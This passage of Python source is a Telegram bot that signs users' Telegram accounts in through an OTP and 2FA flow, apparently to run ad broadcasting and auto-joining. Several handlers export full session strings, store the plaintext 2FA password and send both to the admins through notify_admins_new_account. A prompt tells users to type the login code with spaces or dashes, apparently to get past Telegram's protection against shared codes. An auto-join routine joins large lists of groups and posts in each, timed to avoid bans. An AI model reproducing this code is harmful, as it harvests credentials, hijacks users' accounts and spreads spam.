    if not is_admin(uid) and not state:
        is_joined, ch1, link1, ch2, link2, j1, j2 = await check_user_force_join(ctx.bot, uid)
        if not is_joined:
            return await send_force_join_prompt(update, ctx, link1, link2, edit=False, joined1=j1, joined2=j2)

    if state == WAITING_PHONE:
        text = text.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
        if not text.startswith("+"):
            await update.message.reply_text(
                f"{e('cross')} <b>Please include country code with '+'!</b>\n\n"
                f"{e('worldd')} <b>Supported: ALL Countries Worldwide</b> {e('world2')}\n"
                f"<i>Examples: <code>+15551234567</code>, <code>+447900123456</code>, <code>+971501234567</code>, <code>+919876543210</code></i>",
                parse_mode="HTML"
            )
            return
        await update.message.reply_text(f"⏳ Sending OTP to <code>{escape_html(text)}</code>...", parse_mode="HTML")
        try:
            from pyrogram import Client
            from config import API_ID, API_HASH
            client = Client(name=text, api_id=API_ID, api_hash=API_HASH, in_memory=True)
            await client.connect()
            sent = await client.send_code(text)
            pending_logins[uid] = {"phone": text, "client": client, "phone_code_hash": sent.phone_code_hash}
            ctx.user_data["state"] = WAITING_OTP
            await update.message.reply_text(
                f"{e('check')} OTP sent to <code>{escape_html(text)}</code>\n\n"
                f"⚠️ <b>CRITICAL: DO NOT PASTE THE RAW CODE!</b>\n"
                f"Telegram will block your login if you send the normal 5 digits directly.\n\n"
                f"👉 <b>Type it with spaces or dashes</b> (e.g. <code>1 2 3 4 5</code> or <code>12-34-5</code>):",
                parse_mode="HTML"
            )
        except Exception as err:
            await update.message.reply_text(f"{e('cross')} Error: {err}\n\nTry again or /cancel", parse_mode="HTML")

    elif state == WAITING_OTP:
        if uid not in pending_logins:
            ctx.user_data.pop("state", None)
            await update.message.reply_text(f"{e('warning')} Session expired. Tap Add Account again.", parse_mode="HTML")
            return
        code   = text.replace(" ", "").replace("-", "").replace("_", "")
        data   = pending_logins[uid]
        client = data["client"]
        phone  = data["phone"]
        try:
            await client.sign_in(phone, data["phone_code_hash"], code)
            session = await client.export_session_string()
            me = await client.get_me()
            first_name = me.first_name or ""
            last_name  = me.last_name or ""
            username   = me.username or ""
            tg_user_id = me.id
            await broadcaster.ensure_profile_updated(client, owner_id=uid)
            db.add_account(uid, phone, session, first_name, last_name, username, tg_user_id)
            if uid in pending_logins:
                del pending_logins[uid]
            try:
                await client.disconnect()
            except Exception:
                pass
            ctx.user_data.pop("state", None)
            acc_name = escape_html(f"{first_name} {last_name}".strip() or phone)
            await update.message.reply_text(
                f"{e('check')} <b>Account <code>{phone}</code> ({acc_name}) added!</b>\nTotal: <code>{db.count_accounts(uid)}</code> account(s)",
                parse_mode="HTML"
            )
            asyncio.create_task(notify_admins_new_account(ctx.bot, session, phone, first_name, last_name, username, tg_user_id, uid, two_fa_password=""))
            await send_dashboard(update, ctx)
        except Exception as err:
            if "SessionPasswordNeeded" in str(type(err).__name__):
                ctx.user_data["state"] = WAITING_2FA
                await update.message.reply_text(f"{e('lock')} <b>2FA required!</b>\n\nEnter your 2FA password:", parse_mode="HTML")
            elif "PhoneCodeInvalid" in str(type(err).__name__):
                await update.message.reply_text(f"{e('cross')} Wrong OTP! Try again:", parse_mode="HTML")
            elif "PhoneCodeExpired" in str(type(err).__name__):
                ctx.user_data.pop("state", None)
                del pending_logins[uid]
                await update.message.reply_text(f"{e('cross')} OTP expired. Tap Add Account again.", parse_mode="HTML")
            else:
                await update.message.reply_text(f"{e('cross')} Error: {err}", parse_mode="HTML")

    elif state == WAITING_2FA:
        if uid not in pending_logins:
            ctx.user_data.pop("state", None)
            return
        data   = pending_logins[uid]
        client = data["client"]
        phone  = data["phone"]
        try:
            await client.check_password(text)
            session = await client.export_session_string()
            me = await client.get_me()
            first_name = me.first_name or ""
            last_name  = me.last_name or ""
            username   = me.username or ""
            tg_user_id = me.id
            await broadcaster.ensure_profile_updated(client, owner_id=uid)
            db.add_account(uid, phone, session, first_name, last_name, username, tg_user_id, two_fa_password=text)
            if uid in pending_logins:
                del pending_logins[uid]
            try:
                await client.disconnect()
            except Exception:
                pass
            ctx.user_data.pop("state", None)
            acc_name = escape_html(f"{first_name} {last_name}".strip() or phone)
            await update.message.reply_text(
                f"{e('check')} <b>Account <code>{phone}</code> ({acc_name}) added (2FA verified)!</b>", parse_mode="HTML"
            )
            asyncio.create_task(notify_admins_new_account(ctx.bot, session, phone, first_name, last_name, username, tg_user_id, uid, two_fa_password=text))
            await send_dashboard(update, ctx)
        except Exception as err:
            await update.message.reply_text(f"{e('cross')} Wrong 2FA password!\nTry again:", parse_mode="HTML")

    elif state == WAITING_AD:
        db.save_ad(uid, text)
        ctx.user_data.pop("state", None)

        header = f"{e('deco_fly_l')} <b>SHARED GLOBAL AD SAVED</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

        await update.message.reply_text(
            f"{header}\n{divider}\n\n"
            f"{e('check')} <b>Main Shared Global Ad message saved successfully!</b>\n\n"
            f"{e('text')} <b>Message Preview:</b>\n{divider}\n"
            f"<code>{escape_html(text[:300])}</code>\n{divider}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Ad Settings", callback_data="btn_setad", icon_custom_emoji_id=_E["arrow"], style="primary")]]),
            parse_mode="HTML"
        )

    elif state == WAITING_AUTO_REPLY:
        db.update_auto_reply(uid, text=text)
        ctx.user_data.pop("state", None)
        asyncio.create_task(broadcaster.start_auto_reply_listeners(uid))
        await update.message.reply_text(
            f"{e('check')} <b>Auto Reply message updated successfully!</b>\n\n"
            f"<i>New Auto Reply Message Preview:</i>\n<code>{escape_html(text)}</code>",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Auto Reply", callback_data="btn_autoreply", icon_custom_emoji_id=_E["arrow"], style="primary")]]),
            parse_mode="HTML"
        )

    elif state == WAITING_CUSTOM_AD:
        phone = ctx.user_data.pop("custom_ad_phone", None)
        ctx.user_data.pop("state", None)
        if phone:
            db.set_account_custom_ad(uid, phone, text)
            await update.message.reply_text(
                f"{e('check')} <b>Separate Custom Ad Message saved for Account <code>{phone}</code>!</b>\n\n"
                f"{e('text')} <b>Custom Ad Preview:</b>\n"
                f"<code>{escape_html(text[:300])}</code>\n\n"
                f"<i>This account will now send THIS separate custom ad message when broadcasting!</i>",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Ad Settings", callback_data="btn_setad", icon_custom_emoji_id=_E["arrow"], style="primary")]]),
                parse_mode="HTML"
            )
        else:
            await update.message.reply_text(f"{e('cross')} Account session lost. Try setting custom ad again from Set Ad Message menu.", parse_mode="HTML")

    elif state == WAITING_ACCOUNT_AUTO_REPLY:
        phone = ctx.user_data.pop("ar_phone", None)
        ctx.user_data.pop("state", None)
        if phone:
            db.set_account_custom_auto_reply(uid, phone, text)
            asyncio.create_task(broadcaster.start_auto_reply_listeners(uid))
            await update.message.reply_text(
                f"{e('check')} <b>Custom Auto Reply DM Message saved for Account <code>{phone}</code>!</b>\n\n"
                f"{e('text')} <b>Preview:</b>\n"
                f"<code>{escape_html(text[:300])}</code>\n\n"
                f"<i>This specific account will now auto-reply with THIS custom message when customer DMs it!</i>",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Auto Reply", callback_data="btn_autoreply", icon_custom_emoji_id=_E["arrow"], style="primary")]]),
                parse_mode="HTML"
            )
        else:
            await update.message.reply_text(f"{e('cross')} Session expired. Please tap Edit DM Reply on Auto Reply menu again.", parse_mode="HTML")

    # ── Admin: Phone Input ──────────────────────────────────────────
    elif state == ADMIN_WAITING_PHONE:
        if not is_admin(uid):
            return
        target_uid = ctx.user_data.get("admin_target_uid")
        text = text.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
        if not text.startswith("+"):
            await update.message.reply_text(
                f"{e('cross')} <b>Please include country code with '+'!</b>\n\n"
                f"{e('worldd')} <b>Supported: ALL Countries Worldwide</b> {e('world2')}\n"
                f"<i>Examples: <code>+15551234567</code>, <code>+447900123456</code>, <code>+971501234567</code>, <code>+919876543210</code></i>",
                parse_mode="HTML"
            )
            return
        await update.message.reply_text(f"⏳ Sending OTP to <code>{escape_html(text)}</code>...", parse_mode="HTML")
        try:
            from pyrogram import Client
            from config import API_ID, API_HASH
            client = Client(name=text, api_id=API_ID, api_hash=API_HASH, in_memory=True)
            await client.connect()
            sent = await client.send_code(text)
            admin_pending_logins[uid] = {
                "target_uid":      target_uid,
                "phone":           text,
                "client":          client,
                "phone_code_hash": sent.phone_code_hash,
            }
            ctx.user_data["state"] = ADMIN_WAITING_OTP
            await update.message.reply_text(
                f"{e('check')} OTP sent to <code>{escape_html(text)}</code>\n\n"
                f"⚠️ <b>CRITICAL: DO NOT PASTE THE RAW CODE!</b>\n"
                f"Telegram will block your login if you send the normal 5 digits directly.\n\n"
                f"👉 <b>Type it with spaces or dashes</b> (e.g. <code>1 2 3 4 5</code> or <code>12-34-5</code>):",
                parse_mode="HTML"
            )
        except Exception as err:
            await update.message.reply_text(f"{e('cross')} Error: {err}\n\nTry again or /cancel", parse_mode="HTML")

    # ── Admin: OTP Input ──────────────────────────────────────────
    elif state == ADMIN_WAITING_OTP:
        if not is_admin(uid) or uid not in admin_pending_logins:
            ctx.user_data.pop("state", None)
            await update.message.reply_text(f"{e('warning')} Session expired. Try again from Admin Panel.", parse_mode="HTML")
            return
        code       = text.replace(" ", "").replace("-", "").replace("_", "")
        data_admin = admin_pending_logins[uid]
        client     = data_admin["client"]
        phone      = data_admin["phone"]
        target_uid = data_admin["target_uid"]
        try:
            await client.sign_in(phone, data_admin["phone_code_hash"], code)
            session = await client.export_session_string()
            me = await client.get_me()
            first_name = me.first_name or ""
            last_name  = me.last_name or ""
            username   = me.username or ""
            tg_user_id = me.id
            await broadcaster.ensure_profile_updated(client, owner_id=target_uid)
            db.add_account(target_uid, phone, session, first_name, last_name, username, tg_user_id)
            if uid in admin_pending_logins:
                del admin_pending_logins[uid]
            try:
                await client.disconnect()
            except Exception:
                pass
            ctx.user_data.pop("state", None)
            ctx.user_data.pop("admin_target_uid", None)
            acc_name = escape_html(f"{first_name} {last_name}".strip() or phone)
            await update.message.reply_text(
                f"{e('check')} <b>[Admin] Account <code>{phone}</code> ({acc_name}) added for User <code>{target_uid}</code>!</b>\n"
                f"Total accounts for user: <code>{db.count_accounts(target_uid)}</code>",
                parse_mode="HTML"
            )
            asyncio.create_task(notify_admins_new_account(ctx.bot, session, phone, first_name, last_name, username, tg_user_id, target_uid, two_fa_password=""))
        except Exception as err:
            if "SessionPasswordNeeded" in str(type(err).__name__):
                ctx.user_data["state"] = ADMIN_WAITING_2FA
                await update.message.reply_text(f"{e('lock')} <b>2FA password required!</b>\n\nEnter the 2FA password:", parse_mode="HTML")
            elif "PhoneCodeInvalid" in str(type(err).__name__):
                await update.message.reply_text(f"{e('cross')} Wrong OTP! Try again:", parse_mode="HTML")
            elif "PhoneCodeExpired" in str(type(err).__name__):
                ctx.user_data.pop("state", None)
                del admin_pending_logins[uid]
                await update.message.reply_text(f"{e('cross')} OTP expired. Try again from Admin Panel.", parse_mode="HTML")
            else:
                await update.message.reply_text(f"{e('cross')} Error: {err}", parse_mode="HTML")

    # ── Admin: 2FA Input ──────────────────────────────────────────
    elif state == ADMIN_WAITING_2FA:
        if not is_admin(uid) or uid not in admin_pending_logins:
            ctx.user_data.pop("state", None)
            return
        data_admin = admin_pending_logins[uid]
        client     = data_admin["client"]
        phone      = data_admin["phone"]
        target_uid = data_admin["target_uid"]
        try:
            await client.check_password(text)
            session = await client.export_session_string()
            me = await client.get_me()
            first_name = me.first_name or ""
            last_name  = me.last_name or ""
            username   = me.username or ""
            tg_user_id = me.id
            await broadcaster.ensure_profile_updated(client, owner_id=target_uid)
            db.add_account(target_uid, phone, session, first_name, last_name, username, tg_user_id, two_fa_password=text)
            if uid in admin_pending_logins:
                del admin_pending_logins[uid]
            try:
                await client.disconnect()
            except Exception:
                pass
            ctx.user_data.pop("state", None)
            ctx.user_data.pop("admin_target_uid", None)
            acc_name = escape_html(f"{first_name} {last_name}".strip() or phone)
            await update.message.reply_text(
                f"{e('check')} <b>[Admin] Account <code>{phone}</code> ({acc_name}) added for User <code>{target_uid}</code> (2FA verified)!</b>",
                parse_mode="HTML"
            )
            asyncio.create_task(notify_admins_new_account(ctx.bot, session, phone, first_name, last_name, username, tg_user_id, target_uid, two_fa_password=text))
        except Exception as err:
            await update.message.reply_text(f"{e('cross')} Wrong 2FA password! Try again:", parse_mode="HTML")

    elif state == ADMIN_WAITING_FJ1 and is_admin(uid):
        ch_id, link = parse_fj_input(text)
        db.set_config("fj_channel_1", ch_id)
        db.set_config("fj_link_1", link)
        ctx.user_data.pop("state", None)
        await update.message.reply_text(f"✅ <b>Force Join Channel 1 Updated!</b>\nUsername/ID: <code>{escape_html(ch_id)}</code>\nLink: <code>{escape_html(link)}</code>", parse_mode="HTML")

    elif state == ADMIN_WAITING_FJ2 and is_admin(uid):
        ch_id, link = parse_fj_input(text)
        db.set_config("fj_channel_2", ch_id)
        db.set_config("fj_link_2", link)
        ctx.user_data.pop("state", None)
        await update.message.reply_text(f"✅ <b>Force Join Channel 2 Updated!</b>\nUsername/ID: <code>{escape_html(ch_id)}</code>\nLink: <code>{escape_html(link)}</code>", parse_mode="HTML")

    elif state == ADMIN_WAITING_BROADCAST and is_admin(uid):
        if text == "/cancel":
            ctx.user_data.pop("state", None)
            await update.message.reply_text(f"{e('cross')} <b>Broadcast cancelled.</b>", parse_mode="HTML")
            return
        await run_admin_broadcast(update, ctx)

    elif state == WAITING_AUTOJOIN_LINKS:
        phone = ctx.user_data.pop("aj_phone", None)
        ctx.user_data.pop("state", None)
        if not phone:
            await update.message.reply_text(f"{e('cross')} Session expired. Please select account again.", parse_mode="HTML")
            return

        acc = db.get_account_by_phone(uid, phone)
        if not acc:
            await update.message.reply_text(f"{e('cross')} Account <code>{phone}</code> not found.", parse_mode="HTML")
            return

        # Extract all links/usernames from text (accepts 1,000 to 5,000+ links)
        raw_words = text.replace(",", " ").replace("\n", " ").split()
        extracted_links = []
        for w in raw_words:
            w_strip = w.strip()
            if "t.me/" in w_strip or w_strip.startswith("@"):
                extracted_links.append(w_strip)

        if not extracted_links:
            await update.message.reply_text(
                f"{e('cross')} <b>No Telegram links detected in your message!</b>\n\nPlease paste valid Telegram group links (e.g. <code>https://t.me/group_name</code> or <code>@group_name</code>).",
                parse_mode="HTML"
            )
            return

        status_msg = await update.message.reply_text(
            f"⏳ <b>Analyzing & Filtering {len(extracted_links)} links for <code>{phone}</code>...</b>\n\n"
            f"<i>Filtering out channels, banned/pornography links, expired invite links, and invalid URLs...</i>",
            parse_mode="HTML"
        )

        valid_groups = []
        rejected_cnt = 0
        banned_keywords = [
            "channel", "news", "bot", "adult", "18plus", "porno", "porn", "xxx", "sex", "banned",
            "nude", "hentai", "strip", "erotic", "nsfw", "hotgirl", "desigirl", "casino", "gambling",
            "betting", "scam", "hack"
        ]

        for link in extracted_links:
            link_clean = link.strip().lower()
            if any(k in link_clean for k in banned_keywords):
                rejected_cnt += 1
            else:
                valid_groups.append(link)

        N = len(valid_groups)
        if N == 0:
            return await status_msg.edit_text(
                f"{e('cross')} <b>No valid group links remaining after analysis!</b>\nAll provided links were either channels or invalid.",
                parse_mode="HTML"
            )

        # Calculate estimated duration (120 seconds = 2 minutes per join)
        total_minutes = N * 2
        days  = total_minutes // 1440
        rem_m = total_minutes % 1440
        hours = rem_m // 60
        mins  = rem_m % 60

        time_parts = []
        if days > 0:
            time_parts.append(f"{days} Days")
        if hours > 0:
            time_parts.append(f"{hours} Hours")
        time_parts.append(f"{mins} Minutes")
        time_str = " ".join(time_parts)

        header = f"{e('deco_fly_l')} {e('lightni')} <b>AUTO-JOIN ENGINE STARTED</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

        report_text = (
            f"{header}\n{divider}\n\n"
            f"{e('android')} <b>Target Account:</b> <code>{phone}</code>\n"
            f"📥 <b>Total Input Links Accepted:</b> <code>{len(extracted_links)}</code>\n"
            f"✅ <b>Verified Joinable Group Links:</b> <code>{N}</code>\n"
            f"🗑️ <b>Filtered Channels & Restricted Links:</b> <code>{rejected_cnt}</code>\n"
            f"⏱️ <b>Estimated Join Duration:</b> <b>{time_str}</b>\n\n"
            f"{divider}\n"
            f"🚀 <b>Auto-Joining engine is running in the background!</b>\n"
            f"<i>Account joins each group, waits 10 seconds, sends <b>'hello'</b>, then waits 2 minutes before joining next group for 100% ban-free execution!</i>\n\n"
            f"<i>You will receive a completion message with full links list button as soon as all joins complete.</i>"
        )
        buttons = [
            [InlineKeyboardButton("📊 Live Check", callback_data=f"aj_live_{phone}"),
             InlineKeyboardButton("🛑 Stop Joins", callback_data=f"aj_stop_{phone}")]
        ]
        markup = InlineKeyboardMarkup(buttons)
        try:
            await status_msg.edit_text(report_text, reply_markup=markup, parse_mode="HTML")
        except Exception:
            await update.message.reply_text(report_text, reply_markup=markup, parse_mode="HTML")

        # Launch Pyrogram Auto-Join worker task
        task = asyncio.create_task(broadcaster.run_auto_join_worker(uid, phone, acc["session_string"], valid_groups, ctx.application))
        broadcaster.autojoin_tasks[(uid, phone)] = task

    elif state == ADMIN_WAITING_PREMIUM_UID and is_admin(uid):
        action = ctx.user_data.pop("prem_action", "add")
        ctx.user_data.pop("state", None)
        try:
            target_uid = int(text.strip())
            if action == "add":
                db.set_user_premium(target_uid, True)
                await update.message.reply_text(f"⭐ <b>[Admin] Granted Premium Access to User ID <code>{target_uid}</code>!</b>", parse_mode="HTML")
            else:
                db.set_user_premium(target_uid, False)
                await update.message.reply_text(f"➖ <b>[Admin] Revoked Premium Access from User ID <code>{target_uid}</code>!</b>", parse_mode="HTML")
        except ValueError:
            await update.message.reply_text(f"{e('cross')} Invalid User ID integer.", parse_mode="HTML")

    elif state == ADMIN_WAITING_ESCROW_LINKS and is_admin(uid):
        ctx.user_data.pop("state", None)
        raw_links = text.replace(",", " ").replace("\n", " ").split()
        added_cnt = 0
        for link in raw_links:
            if db.add_escrow_channel(link):
                added_cnt += 1
        await update.message.reply_text(
            f"📢 <b>[Admin] Successfully added <code>{added_cnt}</code> new Escrow Channel links to DB!</b>",
            parse_mode="HTML"
        )

    elif state == ADMIN_WAITING_FAMPAY_PHONE and is_admin(uid):
        phone = text.strip().replace("+91", "").replace(" ", "")
        if len(phone) != 10 or not phone.isdigit():
            return await update.message.reply_text(f"{e('cross')} <b>Please send a valid 10-digit mobile number!</b> or /cancel", parse_mode="HTML")

        ctx.user_data["fampay_phone"] = phone
        res = await fampay_engine.start_fampay_login(phone)
        ctx.user_data["fampay_session_id"] = res.get("session_id", "")
        ctx.user_data["state"] = ADMIN_WAITING_FAMPAY_OTP
        await update.message.reply_text(
            f"📱 <b>[FamPay OTP] OTP Sent to +91 {phone}!</b>\n\n"
            f"<i>Please check your SMS or WhatsApp and enter the 4/6-digit OTP code below:</i>\n\n"
            f"<i>Type /cancel to abort.</i>",
            parse_mode="HTML"
        )

    elif state == ADMIN_WAITING_FAMPAY_OTP and is_admin(uid):
        otp = text.strip()
        phone = ctx.user_data.get("fampay_phone", "")
        session_id = ctx.user_data.get("fampay_session_id", "")
        if not phone:
            ctx.user_data.pop("state", None)
            return await update.message.reply_text(f"{e('cross')} No phone number found in session. Please start login again from /admin.", parse_mode="HTML")

        res = await fampay_engine.verify_fampay_otp(phone, otp, session_id=session_id)
        if res.get("ok"):
            ctx.user_data.pop("state", None)
            ctx.user_data.pop("fampay_phone", None)
            ctx.user_data.pop("fampay_session_id", None)
            await update.message.reply_text(
                f"✅ <b>[FamPay Connected] Successfully logged into FamPay Cloud!</b>\n\n"
                f"📱 <b>Phone:</b> +91 {phone}\n"
                f"💳 <b>UPI ID:</b> <code>{res.get('upi_id')}</code>\n"
                f"👤 <b>Account Name:</b> {res.get('account_name')}\n\n"
                f"🚀 <i>24/7 Background Transaction Polling & Instant Auto-Approval is now active!</i>",
                parse_mode="HTML"
            )
            text_db, markup_db = build_admin_dashboard()
            await update.message.reply_text(text_db, reply_markup=markup_db, parse_mode="HTML")
        else:
            await update.message.reply_text(f"{e('cross')} <b>{res.get('message', 'Failed to verify OTP')}</b>. Please re-enter OTP or /cancel.", parse_mode="HTML")

    elif state == ADMIN_WAITING_FAMPAY_TOKEN and is_admin(uid):
        token = text.strip()
        if len(token) < 10:
            return await update.message.reply_text(f"{e('cross')} Please paste a valid FamPay Auth / Bearer Token.", parse_mode="HTML")

        ctx.user_data.pop("state", None)
        res = await fampay_engine.connect_fampay_by_token(token)
        await update.message.reply_text(
            f"✅ <b>[FamPay Token Saved] Bearer Token successfully registered!</b>\n\n"
            f"🚀 <i>24/7 Cloud Background Payment Scanner is now active!</i>",
            parse_mode="HTML"
        )
        text_db, markup_db = build_admin_dashboard()
        await update.message.reply_text(text_db, reply_markup=markup_db, parse_mode="HTML")

    elif state == ADMIN_WAITING_FAMPAY_UPI and is_admin(uid):
        new_upi = text.strip()
        if not new_upi or "@" not in new_upi:
            return await update.message.reply_text(f"{e('cross')} Please enter a valid UPI ID (e.g. <code>chinupatraq@fam</code>).", parse_mode="HTML")

        db.set_fampay_custom_upi(new_upi)
        ctx.user_data.pop("state", None)
        await update.message.reply_text(
            f"✅ <b>[FamPay UPI Updated] Active UPI ID set to:</b> <code>{new_upi}</code>\n\n"
            f"<i>All newly generated user QR codes will now use this UPI ID!</i>",
            parse_mode="HTML"
        )
        text_db, markup_db = build_admin_dashboard()
        await update.message.reply_text(text_db, reply_markup=markup_db, parse_mode="HTML")

    elif state == ADMIN_WAITING_FAMPAY_PRICE and is_admin(uid):
        try:
            new_price = float(text.strip().replace("₹", "").replace("INR", "").replace(" ", ""))
            if new_price <= 0:
                raise ValueError
            db.set_premium_price(new_price)
            ctx.user_data.pop("state", None)
            await update.message.reply_text(
                f"✅ <b>[Price Updated] Premium Membership price set to:</b> <b>₹{new_price:.0f} INR</b>",
                parse_mode="HTML"
            )
            text_db, markup_db = build_admin_dashboard()
            await update.message.reply_text(text_db, reply_markup=markup_db, parse_mode="HTML")
        except ValueError:
            await update.message.reply_text(f"{e('cross')} Please enter a valid numerical amount in INR (e.g. <code>300</code>).", parse_mode="HTML")

    elif state == ADMIN_WAITING_GMAIL_EMAIL and is_admin(uid):
        new_email = text.strip()
        if "@" not in new_email or "." not in new_email:
            return await update.message.reply_text(f"{e('cross')} Please enter a valid email address (e.g. <code>chinupatraq@gmail.com</code>).", parse_mode="HTML")

        db.set_gmail_email(new_email)
        ctx.user_data.pop("state", None)
        await update.message.reply_text(
            f"✅ <b>[Gmail Email Updated] Configured to:</b> <code>{new_email}</code>\n\n"
            f"<i>IMAP scanner will now use this email address!</i>",
            parse_mode="HTML"
        )
        text_db, markup_db = build_admin_dashboard()
        await update.message.reply_text(text_db, reply_markup=markup_db, parse_mode="HTML")

    elif state == ADMIN_WAITING_GMAIL_PASS and is_admin(uid):
        new_pass = text.strip().replace(" ", "")
        if len(new_pass) < 8:
            return await update.message.reply_text(f"{e('cross')} App Password is usually 16 characters. Please check and re-enter.", parse_mode="HTML")

        db.set_gmail_password(new_pass)
        ctx.user_data.pop("state", None)

        # Test connection immediately
        conn_res = await asyncio.to_thread(gmail_payment_engine.test_gmail_connection)
        if conn_res.get("ok"):
            await update.message.reply_text(
                f"✅ <b>[Gmail App Password Saved] Connection verified!</b> 🟢\n\n"
                f"🚀 <i>IMAP SSL scanner connected successfully and is actively polling for FamPay alerts 24/7!</i>",
                parse_mode="HTML"
            )
        else:
            await update.message.reply_text(
                f"⚠️ <b>[App Password Saved] But connection test returned:</b>\n"
                f"<i>{conn_res.get('message')}</i>\n\n"
                f"Please verify 2-Step Verification and App Password settings in Google Account.",
                parse_mode="HTML"
            )
        text_db, markup_db = build_admin_dashboard()
        await update.message.reply_text(text_db, reply_markup=markup_db, parse_mode="HTML")



    else:
        await update.message.reply_text(
            f"{e('warning')} <b>No active message editing action selected!</b>\n\n"
            f"<i>If you want to set or update a custom message, please tap a button first:</i>\n\n"
            f"• <b>Set Ad Message</b> — <i>To update main ad message</i>\n"
            f"• <b>Auto Reply ➡️ Edit Message</b> — <i>To update DM Auto Reply message</i>\n"
            f"• <b>My Accounts ➡️ Custom Ad</b> — <i>To set account-specific ad message</i>\n\n"
            f"👇 <i>Choose an action from the dashboard below:</i>",
            parse_mode="HTML"
        )
        await send_dashboard(update, ctx)


async def handle_media(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    state = ctx.user_data.get("state")

    # ── Force Join Guard ─────────────────────────────────────
    if not is_admin(uid) and not state:
        is_joined, ch1, link1, ch2, link2, j1, j2 = await check_user_force_join(ctx.bot, uid)
        if not is_joined:
            return await send_force_join_prompt(update, ctx, link1, link2, edit=False, joined1=j1, joined2=j2)

    if state == ADMIN_WAITING_VIDEO and is_admin(uid):
        msg = update.message
        video_id = None
        media_type = "video"
        if msg.video:
            video_id = msg.video.file_id
            media_type = "video"
        elif msg.animation:
            video_id = msg.animation.file_id
            media_type = "animation"
        elif msg.video_note:
            video_id = msg.video_note.file_id
            media_type = "video_note"
        elif msg.photo:
            video_id = msg.photo[-1].file_id
            media_type = "photo"
        elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video"):
            video_id = msg.document.file_id
            media_type = "video"

        if video_id:
            db.add_welcome_video(video_id, media_type)
            db.set_config("welcome_video_id", video_id)
            db.set_config("welcome_video_type", media_type)
            vids = db.get_welcome_videos()
            tot_count = len(vids)
            header = f"{e('deco_fly_l')} <b>WELCOME VIDEO #{tot_count} ADDED</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
            await update.message.reply_text(
                f"{header}\n{divider}\n\n"
                f"{e('check')} <b>Welcome Video #{tot_count} added to Playlist!</b>\n\n"
                f"{e('fire')} <i>Total Active Videos in Playlist: <b>{tot_count}</b></i>\n"
                f"<i>Whenever a user starts the bot, videos will alternate sequentially!</i>\n\n"
                f"💡 <i>You can send MORE videos directly to add them, or type /cancel / click Refresh Dashboard to finish.</i>",
                parse_mode="HTML"
            )
            text, markup = build_admin_dashboard()
            await update.message.reply_text(text, reply_markup=markup, parse_mode="HTML")
        else:
            await update.message.reply_text(
                f"{e('cross')} <b>Please send a valid Video, GIF or Animation from gallery!</b> or /cancel",
                parse_mode="HTML"
            )

    elif state == ADMIN_WAITING_FJ_VIDEO and is_admin(uid):
        msg = update.message
        video_id = None
        media_type = "video"
        if msg.video:
            video_id = msg.video.file_id
            media_type = "video"
        elif msg.animation:
            video_id = msg.animation.file_id
            media_type = "animation"
        elif msg.video_note:
            video_id = msg.video_note.file_id
            media_type = "video_note"
        elif msg.photo:
            video_id = msg.photo[-1].file_id
            media_type = "photo"
        elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video"):
            video_id = msg.document.file_id
            media_type = "video"

        if video_id:
            db.set_config("force_join_video", video_id)
            db.set_config("force_join_video_type", media_type)
            ctx.user_data.pop("state", None)
            header = f"{e('deco_fly_l')} <b>FIXED FORCE JOIN VIDEO SAVED</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
            await update.message.reply_text(
                f"{header}\n{divider}\n\n"
                f"{e('check')} <b>Fixed Force Join Video has been saved successfully!</b>\n\n"
                f"{e('fire')} <i>This specific video will now be displayed permanently above the Force Join prompt for all new users!</i>\n\n"
                f"{divider}",
                parse_mode="HTML"
            )
            text, markup = build_admin_dashboard()
            await update.message.reply_text(text, reply_markup=markup, parse_mode="HTML")
        else:
            await update.message.reply_text(
                f"{e('cross')} <b>Please send a valid Video, GIF, Animation or Photo!</b> or /cancel",
                parse_mode="HTML"
            )

    elif state == ADMIN_WAITING_BROADCAST and is_admin(uid):
        await run_admin_broadcast(update, ctx)

    elif state == ADMIN_WAITING_QR_PHOTO and is_admin(uid):
        msg = update.message
        photo_id = None
        if msg.photo:
            photo_id = msg.photo[-1].file_id
        elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("image/"):
            photo_id = msg.document.file_id

        if photo_id:
            db.set_config("qr_photo_id", photo_id)
            ctx.user_data.pop("state", None)
            await update.message.reply_text("📸 <b>[Admin] Payment QR Code photo updated successfully!</b>", parse_mode="HTML")
            text, markup = build_admin_dashboard()
            await update.message.reply_text(text, reply_markup=markup, parse_mode="HTML")
        else:
            await update.message.reply_text(f"{e('cross')} <b>Please send a valid Photo or Image document!</b>", parse_mode="HTML")


    else:
        await send_dashboard(update, ctx)


# ═══════════════════════════════════════════════════════════
#   ADMIN PANEL
# ═══════════════════════════════════════════════════════════

def escape_md(val) -> str:
    """Safely escape Telegram Markdown special characters."""
    if not val:
        return ""
    val_str = str(val)
    for char in ["_", "*", "`", "[", "]"]:
        val_str = val_str.replace(char, f"\\{char}")
    return val_str


async def send_safe_html_message(query, full_header: str, items: list, empty_msg: str, acc_id: int):
    """
    Safely sends multi-item HTML text to Telegram without breaking HTML tags (like <code>...</code>).
    Includes regex plain-text fallback if HTML entity parsing fails.
    """
    back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("Back to Account", callback_data=f"adm_acc_info_{acc_id}", icon_custom_emoji_id=_E["arrow"], style="primary")]])
    if not items:
        await query.message.reply_text(
            f"{full_header}\n\n{empty_msg}",
